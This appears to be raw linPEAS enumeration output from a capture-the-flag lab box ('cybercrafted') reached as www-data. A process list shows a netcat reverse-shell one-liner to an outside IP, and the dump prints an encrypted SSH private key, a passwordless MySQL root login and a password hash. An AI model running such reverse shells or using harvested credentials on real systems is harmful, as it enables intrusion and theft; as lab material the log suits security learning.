www-data  2884  0.0  0.0   4636   880 ?        S    18:48   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f
www-data  2887  0.0  0.0   4680   832 ?        S    18:48   0:00  |       _ cat /tmp/f
www-data  2888  0.0  0.1  18516  3228 ?        S    18:48   0:00  |       _ bash -i
www-data  2893  0.0  0.4  37304  9204 ?        S    18:49   0:00  |       |   _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  2894  0.0  0.1  18516  3384 pts/1    Ss   18:49   0:00  |       |       _ /bin/bash
www-data  2933  0.0  0.0   4680   820 pts/1    S+   18:53   0:00  |       |           _ cat f
www-data  2889  0.0  0.1  15720  2172 ?        S    18:48   0:00  |       _ nc 10.8.19.103 1337
www-data  2939  0.0  0.5 338376 10240 ?        S    18:57   0:00  _ /usr/sbin/apache2 -k start
www-data  2940  0.0  0.4 338204 10172 ?        S    18:57   0:00  _ /usr/sbin/apache2 -k start
www-data  2941  0.0  0.4 338204 10172 ?        S    18:57   0:00  _ /usr/sbin/apache2 -k start
mysql     1229  0.0  9.4 1161804 191868 ?      Sl   16:27   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     829 Oct  6  2021 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Jun 26  2021 .
drwxr-xr-x 102 root root 4096 Oct 15  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Jan 14  2020 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  191 Aug  6  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x   2 root root 4096 Sep 30  2021 .
drwxr-xr-x 102 root root 4096 Oct 15  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug  6  2020 .
drwxr-xr-x 102 root root 4096 Oct 15  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug  6  2020 .
drwxr-xr-x 102 root root 4096 Oct 15  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jun 26  2021 .
drwxr-xr-x 102 root root 4096 Oct 15  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* *	1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafted/world/*
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES
Wed 2023-03-08 19:09:00 UTC  9min left   Wed 2023-03-08 18:39:36 UTC  20min ago    phpsessionclean.timer        phpsessionclean.service
Thu 2023-03-09 03:52:32 UTC  8h left     Wed 2023-03-08 17:08:46 UTC  1h 50min ago ua-messaging.timer           ua-messaging.service
Thu 2023-03-09 04:16:29 UTC  9h left     Wed 2023-03-08 16:27:43 UTC  2h 32min ago apt-daily.timer              apt-daily.service
Thu 2023-03-09 06:51:20 UTC  11h left    Wed 2023-03-08 16:27:43 UTC  2h 32min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2023-03-09 10:01:57 UTC  15h left    Wed 2023-03-08 16:27:43 UTC  2h 32min ago motd-news.timer              motd-news.service
Thu 2023-03-09 16:42:46 UTC  21h left    Wed 2023-03-08 16:42:46 UTC  2h 16min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2023-03-13 00:00:00 UTC  4 days left Wed 2023-03-08 16:27:43 UTC  2h 32min ago fstrim.timer                 fstrim.service
n/a                          n/a         n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/screen/S-root/1021.cybercrafted
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 815 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 833 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                 930 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.23                               1070 polkitd         root             :1.23         polkit.service            -          -                  
:1.24                               1026 networkd-dispat root             :1.24         networkd-dispatcher.se…ce -          -                  
:1.25                               1007 unattended-upgr root             :1.25         unattended-upgrades.se…ce -          -                  
:1.3                                   1 systemd         root             :1.3          init.scope                -          -                  
:1.4                                1016 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
:1.73                               9590 busctl          www-data         :1.73         apache2.service           -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts            1016 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1          1070 polkitd         root             :1.23         polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               930 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1             815 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             833 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.3          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
cybercrafted
127.0.0.1 localhost
127.0.1.1 cybercrafted

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.88.215  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::7c:f6ff:fe43:737b  prefixlen 64  scopeid 0x20<link>
        ether 02:7c:f6:43:73:7b  txqueuelen 1000  (Ethernet)
        RX packets 502240  bytes 71529013 (71.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 498899  bytes 178054641 (178.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4097  bytes 405019 (405.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4097  bytes 405019 (405.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::25565                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=33(www-data) gid=33(www-data) groups=33(www-data)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash
root:x:0:0:root:/root:/bin/bash
xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
uid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 18:59:49 up  2:32,  0 users,  load average: 1.01, 0.21, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Sat Jun 26 16:34:08 2021 - Sat Jun 26 16:35:43 2021  (00:01)     0.0.0.0
thm      tty1         Sat Jun 26 14:23:52 2021 - down                      (02:08)     0.0.0.0
reboot   system boot  Sat Jun 26 14:23:28 2021 - Sat Jun 26 16:32:41 2021  (02:09)     0.0.0.0
thm      tty1         Sat Jun 26 10:50:56 2021 - down                      (02:22)     0.0.0.0
reboot   system boot  Sat Jun 26 10:50:22 2021 - Sat Jun 26 13:13:04 2021  (02:22)     0.0.0.0
thm      tty1         Sat Jun 26 10:47:39 2021 - down                      (00:02)     0.0.0.0
thm      tty1         Sat Jun 26 10:27:48 2021 - Sat Jun 26 10:46:58 2021  (00:19)     0.0.0.0
reboot   system boot  Sat Jun 26 10:15:46 2021 - Sat Jun 26 10:49:42 2021  (00:33)     0.0.0.0

wtmp begins Sat Jun 26 10:15:46 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/gcc
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.35, for Linux (x86_64) using  EditLine wrapper


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. Yes
User	Host	authentication_string
root	localhost	
mysql.session	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint	localhost	*A73B2A5E6692EE82361407AC83BFB67EAA02D31C

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Sep 12  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2021-09-28T11:01:16
httpd Not Found

Nginx version: nginx Not Found

/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Sep 12  2021 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Sep 12  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Sep 12  2021 /etc/apache2/sites-enabled/main.thm.conf -> ../sites-available/main.thm.conf
<VirtualHost *:80>
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	ServerAdmin admin@cybercrafted.thm
	ServerName cybercrafted.thm
	ServerAlias www.cybercrafted.thm
	DocumentRoot /var/www/tld
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	ServerAdmin admin@store.cybercrafted.thm
	ServerName store.cybercrafted.thm
	ServerAlias www.store.cybercrafted.thm
	DocumentRoot /var/www/store
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	ServerAdmin admin@admin.cybercrafted.thm
	ServerName admin.cybercrafted.thm
	ServerAlias www.admin.cybercrafted.thm
	DocumentRoot /var/www/admin
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1328 Jun 26  2021 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
	ServerAdmin admin@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 Oct  7  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 Oct  7  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Jun 26  2021 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)

-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 1766 Jun 27  2021 /home/xxultimatecreeperxx/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6
Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG
+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U
SCc7TmWJgI/Bt6k9J60WNThmjKdYTuaLymOVJjiajho799BnAQWE89jOLwE3VA5m
SfcytNIJkHHQR67K2z2f0noCh2jVkM0sx8QS+hUBeNWT6lr3pEoBKPk5BkRgbpAu
lSkN+Ubrq2/+DA1e/LB9u9unwi+zUec1G5utqfmNPIHYyB2ZHWpX8Deyq5imWwH9
FkqfnN3JpXIW22TOMPYOOKAjan3XpilhOGhbZf5TUz0StZmQfozp5WOU/J5qBTtQ
sXG4ySXCWGEq5Mtj2wjdmOBIjbmVURWklbsN+R6UiYeBE5IViA9sQTPXcYnfDNPm
stB2ukMrnmINOu0U2rrHFqOwNKELmzSr7UmdxiHCWHNOSzH4jYl0zjWI7NZoTLNA
eE214PUmIhiCkNWgcymwhJ5pTq5tUg3OUeq6sSDbvU8hCE6jjq5+zYlqs+DkIW2v
VeaVnbA2hij69kGQi/ABtS9PrvRDj/oSIO4YMyZIhvnH+miCjNUNxVuH1k3LlD/6
LkvugR2wXG2RVdGNIwrhtkz8b5xaUvLY4An/rgJpn8gYDjIJj66uKQs5isdzHSlf
jOjh5qkRyKYFfPegK32iDfeD3F314L3KBaAlSktPKpQ+ooqUtTa+Mngh3CL8JpOO
Hi6qk24cpDUx68sSt7wIzdSwyYW4A/h0vxnZSsU6kFAqR28/6pjThHoQ0ijdKgpO
8wj/u29pyQypilQoWO52Kis4IzuMN6Od+R8L4RnCV3bBR4ppDAnW3ADP312FajR+
DQAHHtfpQJYH92ohpj3dF5mJTT+aL8MfAhSUF12Mnn9d9MEuGRKIwHWF4d1K69lr
0GpRSOxDrAafNnfZoykOPRjZsswK3YXwFu3xWQFl3mZ7N+6yDOSTpJgJuNfiJ0jh
MBMMh4+r7McEOhl4f4jd0PHPf3TdxaONzHtAoj69JYDIrxwJ28DtVuyk89pu2bY7
mpbcQFcsYHXv6Evh/evkSGsorcKHv1Uj3BCchL6V4mZmeJfnde6EkINNwRW8vDY+
gIYqA/r2QbKOdLyHD+xP4SpX7VVFliXXW9DDqdfLJ6glMNNNbM1mEzHBMywd1IKE
Zm+7ih+q4s0RBClsV0IQnzCrSij//4urAN5ZaEHf0k695fYAKMs41/bQ/Tv7kvNc
T93QJjphRwSKdyQIuuDsjCAoB7VuMI4hCrEauTavXU82lmo1cALeNSgvvhxxcd7r
1egiyyvHzUtOUP3RcOaxvHwYGQxGy1kq88oUaE7JrV2iSHBQTy6NkCV9j2RlsGZY
fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
-----END RSA PRIVATE KEY-----



-rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 414 Jun 27  2021 /home/xxultimatecreeperxx/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCujxl8VJ5ZqkNb8zznyHX1ql42X8PiJ/4BrWOR9Oytc6wghw2SM7QC5iajDwA/ZMxY3zyTz3m79w/0eVV39TFCP/UsY3rybk0RJMfXX+24TwTThx1NZGcliMz9jSA5FaxCV9SebGyFOFcIPxeBDx86vLOrTN/hizefiYzq0C/wDVrc9PY9GuFnC0txjVZqLm1ZW92tb7LqsCO551MHerx3+bmmSDqhuWqKE1zAB/4eWhqL3leuhSr4lTjGn2MuxKh7TIdP1BqOqcCcgbB5ELnVbNGLlxUS+kBp1+u9UzzUYQ0whYLKUxePZyDNtHcPiUjH5cMj3ZGidsJRKbPPzVUN xxultimatecreeperxx@cybercrafted

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/home/xxultimatecreeperxx/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
2976PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 12  2021 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-33
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3559 May 11  2021 /etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 26  2021 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 16  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2274 May 27  2021 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 May 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 May 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 May 27  2021 /usr/share/keyrings/ubuntu-advantage-fips.gpg
